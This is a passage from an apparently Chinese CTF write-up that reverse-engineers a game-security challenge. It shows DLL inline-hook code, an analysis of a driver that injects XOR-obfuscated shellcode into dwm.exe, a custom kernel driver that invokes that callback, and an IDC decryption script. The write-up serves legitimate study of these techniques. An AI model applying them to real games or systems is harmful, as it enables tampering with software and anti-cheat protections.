182);">int</span>&gt;WrongPos[] = {<br />    {<span style="color: rgb(255, 115, 253);">-950</span>,<span style="color: rgb(255, 115, 253);">50</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">-390</span>},<br />    {<span style="color: rgb(255, 115, 253);">-950</span>,<span style="color: rgb(255, 115, 253);">170</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">-950</span>,<span style="color: rgb(255, 115, 253);">-210</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">350</span>},<br />    {<span style="color: rgb(255, 115, 253);">-890</span>,<span style="color: rgb(255, 115, 253);">-270</span>},<br />    {<span style="color: rgb(255, 115, 253);">170</span>,<span style="color: rgb(255, 115, 253);">-270</span>},<br />    {<span style="color: rgb(255, 115, 253);">-770</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">110</span>,<span style="color: rgb(255, 115, 253);">-390</span>},<br />    {<span style="color: rgb(255, 115, 253);">-830</span>,<span style="color: rgb(255, 115, 253);">170</span>},<br />};<br />std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;TargetPos[] = {<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">50</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">110</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">170</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">290</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">350</span>},<br />    {<span style="color: rgb(255, 115, 253);">110</span>,<span style="color: rgb(255, 115, 253);">110</span>},<br />    {<span style="color: rgb(255, 115, 253);">170</span>,<span style="color: rgb(255, 115, 253);">170</span>},<br />    {<span style="color: rgb(255, 115, 253);">230</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">110</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">170</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />};<br /><span style="color: rgb(255, 255, 182);">int</span> CountOfWrongPos=<span style="color: rgb(255, 115, 253);">11</span>;<br />__int64 <span style="color: rgb(255, 255, 182);">HackShellcode</span>(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10) {<br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> flag = <span style="color: rgb(255, 115, 253);">1</span>;<br />    memcpy(shellcode, OriginCode,HookLen);              <span style="color: rgb(124, 124, 124);">//unhook</span><br />    <span style="color: rgb(124, 124, 124);">//</span><br />    <span style="color: rgb(255, 255, 182);">int</span> x = a1, y = a2;<br />    <span style="color: rgb(255, 255, 182);">int</span> v13, v14;<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; CountOfWrongPos; i++) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>,<span style="color: rgb(255, 255, 182);">int</span>&gt;{ x,y } == WrongPos[i]) {<br />            x = TargetPos[i].first;<br />            y = TargetPos[i].second;<br />            v13=x;<br />            v14=x*(y+<span style="color: rgb(255, 115, 253);">1</span>);<br />            a3=val[i]^<span style="color: rgb(255, 115, 253);">0x414345</span>;<br />            a4=(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)((a3 ^ (y + v13)) % <span style="color: rgb(255, 115, 253);">256</span><br />                        + (((a3 ^ (v13 * y)) % <span style="color: rgb(255, 115, 253);">256</span> + (((a3 ^ (y + v14)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>));<br />            printf(<span style="color: rgb(168, 255, 96);">"Hook Value Success from position (%d,%d) to (%d,%d)\n"</span>,a1,a2,x,y);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        }<br />    }<br />    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);<br />    times--;<br />    <span style="color: rgb(150, 203, 254);">if</span> (times&gt;<span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"call shellcode(%d,%d,%d,%d,%x) retval=%d\n"</span>,x, y, a3, a4, a5, ret);          <br />    }<br />    <span style="color: rgb(255, 255, 182);">int</span> presize = s.size();<br />    s.insert({ x,y });<br />    <span style="color: rgb(150, 203, 254);">if</span> (s.size() == presize) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (flag) {<br />            printset();<br />            flag = <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />    }<br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//rehook</span><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">HookShellcode</span>() {<br />    __int64 base = GetBaseAddr();<br />    __int64 Ptr = base + <span style="color: rgb(255, 115, 253);">0x8308</span>;<br /><br />    shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />    <span style="color: rgb(150, 203, 254);">while</span> (!shellcode) {<br />        shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />        printf(<span style="color: rgb(168, 255, 96);">"Find shellcode Fail\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">200</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"shellcode addr=%p\n"</span>, shellcode);<br />    memcpy(OriginCode, shellcode,HookLen);              <span style="color: rgb(124, 124, 124);">//saved</span><br />    Func FuncPtr = HackShellcode;<br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)FuncPtr;       <span style="color: rgb(124, 124, 124);">//construct</span><br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//hook</span><br /><br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br />        AllocConsole();<br />        freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />        HookShellcode();<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}</code></pre><p>最终结果也是完美实现了</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c3ef564b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlPiaUz4rN4GicJibiap9UGPiblUBUvnfxZiaSsW8da1xIZlc6a3DdMC5CGyNA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><hr /><p>今天试试复盘这个决赛</p><p>&lt;!--more--&gt;</p><h2>题目</h2><h3>介绍</h3><p>这里有一个在屏幕上画flag的小程序，可好像出了点问题，flag丢失了，需要把它找回来，并尝试截图留念。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=01a64255&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl5kbZxQv0ib5m7lgZrJ9cyCusohYsX4Naicic6o8HXa5mBWEibcxkWUDIIA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>找回flag样例：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0d8f672f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRldvfXLBEgn0LJju0m7ibkXejrzib5v9zU6bvEKs4F8xd5jgmj30FvkJKg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h3>要求</h3><ul><li style="margin-left: 2px;"><p>自行寻找办法加载驱动文件，再执行题目exe文件。</p></li><li style="margin-left: 2px;"><p>不得直接patch系统组件实现绘制（如：直接编写D3D代码绘制flag），只能对题目自身代码进行修改或调用。</p></li><li style="margin-left: 2px;"><p>找回的flag需要和预期图案（包括颜色）一致，如果绘制结果存在偏差会扣除一定分数。</p></li><li style="margin-left: 2px;"><p>修复后的flag截图操作必须在题目同一系统环境中进行（如：虚拟机运行题目则在虚拟机中截图，本机运行题目则在本机截图；不得拍照）。</p></li><li style="margin-left: 2px;"><p>赛后需要提交找回flag的<span style="font-weight: 700;">截图</span>、<span style="font-weight: 700;">解题代码或文档</span>和<span style="font-weight: 700;">截图代码或文档</span>进行评分，方法越多得分越高。</p></li><li style="margin-left: 2px;"><p>建议使用系统版本：Win10 1809、Win10 1903、Win10 1909、Win10 2004、Win10 20h1、Win10 20h2、Win10 21h1、Win10 21h2，在虚拟机中可能无法正常显示图形。</p></li><li style="margin-left: 2px;"><p>提交结果打包为XXX_writeup_A.zip，XXX为名称，A为提交序号，从1开始。</p></li></ul><h2>分析</h2><p>P.S.，在做复现的时候发现虚拟机无法正常绘制，且自己 Win11 的物理机运行会蓝屏，因此本次复现不含动态调试部分，一切只停留于静态分析和理论阶段，刷它指定的系统成本过高了接受不了。</p><h3>驱动分析</h3><p>IDA 打开，</p><p><code style="font-family: SFMono-Regular, Consolas, ;">sub_140001150</code> 函数很像是注册的驱动卸载函数。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">sub_140001188</code> 函数应该就是获取了一下系统信息，没什么东西。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">sub_140001414</code> 函数往下跟到 <code style="font-family: SFMono-Regular, Consolas, ;">sub_1400014A0</code> 函数有大东西，不过这个函数不是直接调用的，像是注册了某种回调，三环程序应该是处罚这个回调的。</p><p>开头通过调用 <code style="font-family: SFMono-Regular, Consolas, ;">sub_140001318</code> 函数获得了 <code style="font-family: SFMono-Regular, Consolas, ;">dwm.exe</code> 的 <code style="font-family: SFMono-Regular, Consolas, ;">EPROCESS</code> 结构。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=60417ad0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlx27hiaak4lTnO3fwBuYdcT0OxIA8LicMQtUFv33zqtJtCiac1ejcTeUkQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>对于接下来调用的函数</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c49ac4be&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlKNT4wEefwZ6icJbpbt7VM1PHc7j22QDurveOoD7ACxny8eib2d94JXpQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">sub_140001000</code> 比较像是获取指定进程的某个 <code style="font-family: SFMono-Regular, Consolas, ;">DLL</code>，具体也跟进来看看</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=d85195f7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlukrRAic5z8kWafNNIpKVumqNdObXy6SyfuCdM8ibibgx5mI37YGvAUiajw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>对于这些API，网上找到了一些说法：</p><p><span style="font-weight: 700;">GetUserModuleBaseAddress():</span> 实现取进程中模块基址，该功能在<code style="font-family: SFMono-Regular, Consolas, ;">《驱动开发：内核取应用层模块基地址》</code>中详细介绍过原理，这段代码核心原理如下所示，此处最需要注意的是如果是<code style="font-family: SFMono-Regular, Consolas, ;">32位进程</code>则我们需要得到<code style="font-family: SFMono-Regular, Consolas, ;">PPEB32 Peb32</code>结构体，该结构体通常可以直接使用<code style="font-family: SFMono-Regular, Consolas, ;">PsGetProcessWow64Process()</code>这个内核函数获取到，而如果是<code style="font-family: SFMono-Regular, Consolas, ;">64位进程</code>则需要将寻找PEB的函数替换为<code style="font-family: SFMono-Regular, Consolas, ;">PsGetProcessPeb()</code></p><p>这个地方也不难判断，就是获取 PEB 结构体，只不过多了一个 32 位和 64 位的判断，以 32 位的为例，中间有类似遍历链表的写法，如果找到了那么把某个结果保存到第二个参数指向的位置然后返回。</p><p>这里且当 <code style="font-family: SFMono-Regular, Consolas, ;">sub_140001264(v24, "D3DCompile");</code> 函数是获取了某个函数的地址作为返回值出去的，随后是比较关键的点</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=051a8421&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl3b59va47Fn4RicKMLYxicdZdjpeqxL8BH0RibzLTPuKnpOhr7LOhKSnzA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>调用了两次 <code style="font-family: SFMono-Regular, Consolas, ;">ZwAllocateVirtualMemory</code> 函数给进程申请内存，然后拷贝 shellcode 并进行了一定的异或混淆，最关键它把 <code style="font-family: SFMono-Regular, Consolas, ;">D3DCompile</code> 的地址和第二次申请内存的地址保存在第一次申请的内存后方，应该是方便 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode</code> 找到虚拟代码，剩下的大概没有什么了，虽然没有运行成功大概也能猜测这个 shellcode 应该就是直接在屏幕绘制的代码了。</p><h3>exe分析</h3><p>三环程序比较大，先用火绒剑分析一下行为，主要是排除 exe 有跟内核做直接数据交互。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b52d6560&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlftVBl4vzibLn7Lc2sNttIDiaaePiaC549E9iaKSGicAt1EjWGoO8vRROHfw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>然而并没有，但是发现它也打开了 <code style="font-family: SFMono-Regular, Consolas, ;">D3DCompiler_47.dll</code>，于是从这里开始交叉引用，通过DLL路径交叉是一个比较好的思路，不管动态加载或者是运行时直接导入，都是可以大概分析到主逻辑的。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=239ecbfc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl87IicHWqotLmbPZQtTZibibMokxlWLRZGkRicc93q90BOVpt2FX9K5vRDw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>里面就进行了一个 <code style="font-family: SFMono-Regular, Consolas, ;">NtQuerySystemInformation</code>，外面是创建线程调用的这个函数，这里应该是触发回调的一个函数，为了验证也是准备去调试，但是它根本不触发这个回调，如图所见。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b37dc26f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlDHmY5tBV0AIHg7tgLSfLAWBJjkyGjh0tRWQ7ge8fn3XcNgXEzTvM9Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>之前配置环境的时候一直以为是虚拟机没有 <code style="font-family: SFMono-Regular, Consolas, ;">dwm.exe</code> 这个进程，结果没想到是回调没有办法调用，于是我选择自己运行一个 dwm.exe 进程（我直接拿初赛的三环程序去改名然后运行，可以在第一个函数成功被获取），然后自己写一个驱动手动调用那个回调写shellcode。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">"ntddk.h"</span>  </span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">void</span> (* func)();<br />PDRIVER_OBJECT g_Object = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _LDR_DATA_TABLE_ENTRY {<br />    LIST_ENTRY InLoadOrderLinks;<br />    LIST_ENTRY InMemoryOrderLinks;<br />    LIST_ENTRY InInitializationOrderLinks;<br />    PVOID DllBase;<br />    PVOID EntryPoint;<span style="color: rgb(124, 124, 124);">//驱动的进入点 DriverEntry  </span><br />    ULONG SizeOfImage;<br />    UNICODE_STRING FullDllName;<span style="color: rgb(124, 124, 124);">//驱动的满路径  </span><br />    UNICODE_STRING BaseDllName;<span style="color: rgb(124, 124, 124);">//不带路径的驱动名字  </span><br />    ULONG Flags;<br />    USHORT LoadCount;<br />    USHORT TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        LIST_ENTRY HashLinks;<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            PVOID SectionPointer;<br />            ULONG CheckSum;<br />        };<br />    };<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            ULONG TimeDateStamp;<br />        };<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            PVOID LoadedImports;<br />        };<br />    };<br />} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br /><br />VOID bianliqudongmokuai(PUNICODE_STRING name, UINT64* pBaseAddr,UINT64* pSize)<br />{<br />    LDR_DATA_TABLE_ENTRY*TE, *Tmp;<br />    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;<br />    PLIST_ENTRY LinkList;<br />    ;<br />    <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>;<br />    LinkList = TE-&gt;InLoadOrderLinks.Flink;  <br />    <span style="color: rgb(150, 203, 254);">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)<br />    {<br />        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;<br />        <span style="color: rgb(150, 203, 254);">if</span> (RtlCompareUnicodeString(&amp;Tmp-&gt;BaseDllName, name, <span style="color: rgb(198, 197, 254);">FALSE</span>))<br />        {<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span><br />        {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"Found Module!\n"</span>));<br />            *pBaseAddr = (UINT64)(Tmp-&gt;DllBase);<br />            *pSize = (UINT64)(Tmp-&gt;SizeOfImage);<br /><br />        }<br />        LinkList = LinkList-&gt;Flink;<br />        i++;<br />    }<br /><br />}<br />VOID Unload(PDRIVER_OBJECT DriverObject)<br />{<br />    kprintf((<span style="color: rgb(168, 255, 96);">"BYE xia0ji233\n"</span>));<br />}<br />NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)<br />{<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Hello xia0ji233\n"</span>));<br />    g_Object = DriverObject;<br />    DriverObject-&gt;DriverUnload = Unload;<br />    UNICODE_STRING name;<br />    UINT64 Base = <span style="color: rgb(255, 115, 253);">0</span>;<br />    UINT64 Size=<span style="color: rgb(255, 115, 253);">0</span>;<br />    RtlInitUnicodeString(&amp;name, L<span style="color: rgb(168, 255, 96);">"2022GameSafeRace.sys"</span>);<br />    <span style="color: rgb(124, 124, 124);">//</span><br />    bianliqudongmokuai(&amp;name,&amp;Base,&amp;Size);<br />    <span style="color: rgb(150, 203, 254);">if</span> (Base) {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Base:%p Size:%x\n"</span>), Base, Size);<br />        func funcptr = (func)(Base + <span style="color: rgb(255, 115, 253);">0x1490</span>);<br />        DbgBreakPoint();<br />        funcptr();<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}</code></pre><p>运行结果如下，用初赛的exe改名为dwm成功被这个函数获取到EProcess。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b97c7815&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlMotibyCU4rbeyW3kCjftIfflX4CNHxJs7eQEOF0rtWGQy3OxZMSiabng%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>随后使用静态分析去解一下 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode</code>，用下面的IDC脚本即可</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;idc.idc&gt;</span></span><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">main</span>(){<br />    <span style="color: rgb(150, 203, 254);">auto</span> start_ea = <span style="color: rgb(255, 115, 253);">0x000000140005A00</span>;<br />    <span style="color: rgb(150, 203, 254);">auto</span> end_ea =  <span style="color: rgb(255, 115, 253);">0x000000140005A00</span>+<span style="color: rgb(255, 115, 253);">0x16E6</span>;<br />    <span style="color: rgb(150, 203, 254);">auto</span> len = end_ea - start_ea;<br />    <span style="color: rgb(150, 203, 254);">auto</span> ea=<span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(150, 203, 254);">for</span> (ea = start_ea; ea &lt; end_ea; ea++) {<br />        PatchByte(ea, Byte(ea)^<span style="color: rgb(255, 115, 253);">0xC3</span>);    <br />    }<br />}</code></pre><p>解密后的 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode</code> 可以被直接反编译</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4234f79b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl0lM00zrWXK4lmnYtxWG5DbyCuUq8wE9I5FBVbg6JgDnTUyBlDKyEew%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>看起来跟初赛是差不多的，相同的配方，相同的味道。</p><p>再往下看</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=58efedf7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRljp4lc5alUgkhHaOoiamriczO7wyXhUozN40vAsbVoK385WJftkHYWYVQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>就连这个ACE都是一样的，这里大概是一个全新的虚拟机了。</p><p>然后本来是打算搜字节码去看看shellcode有没有写成功的，但是发现还是搜不到，突然想到好像这个回调最后会 free 这片内存，所以决定直接改 sys 去把原来的 free 给 <code style="font-family: SFMono-Regular, Consolas, ;">jmp</code> 掉（还是失败，想复现太难了 qwq）。</p><p>还是老老实实分析虚拟机代码吧，看到 <code style="font-family: SFMono-Regular, Consolas, ;">unk_140004030</code>，它被放到了 <code style="font-family: SFMono-Regular, Consolas, ;">BaseAddress + 0x16E6</code> 的位置上，这里的代码在我们看来是在 <code style="font-family: SFMono-Regular, Consolas, ;">0x140005A00</code>，而直接分析可得，代码实际在 <code style="font-family: SFMono-Regular, Consolas, ;">&amp;qword_140009600[136]=0x140009600+136*8=0x140009a40</code> 的位置上。</p><p>然而这里没找到对应的数据，确实也不太会分析了，按理来说如果能直接调试运行到这的话是肯定可以定位shellcode找到位置dump出来的。</p><p>这里还原一下虚拟机的流程吧</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;string.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> code[] ={<span style="color: rgb(255, 115, 253);">0</span>};<br /><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>(){<br />    <span style="color: rgb(255, 255, 182);">int</span> Stack[<span style="color: rgb(255, 115, 253);">0x50</span>];<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 RIP_S=<span style="color: rgb(255, 115, 253);">0</span>; <span style="color: rgb(124, 124, 124);">// rsi</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 v10; <span style="color: rgb(124, 124, 124);">// r8</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> opcode; <span style="color: rgb(124, 124, 124);">// ecx</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 v12; <span style="color: rgb(124, 124, 124);">// rdx</span><br />    __int64 v13; <span style="color: rgb(124, 124, 124);">// rcx</span><br />    __int32 v14; <span style="color: rgb(124, 124, 124);">// r9d</span><br />    __int64 v15; <span style="color: rgb(124, 124, 124);">// r8</span><br />    __int64 v16; <span style="color: rgb(124, 124, 124);">// r9</span><br />    __int32 v17; <span style="color: rgb(124, 124, 124);">// edx</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 v18; <span style="color: rgb(124, 124, 124);">// r10</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 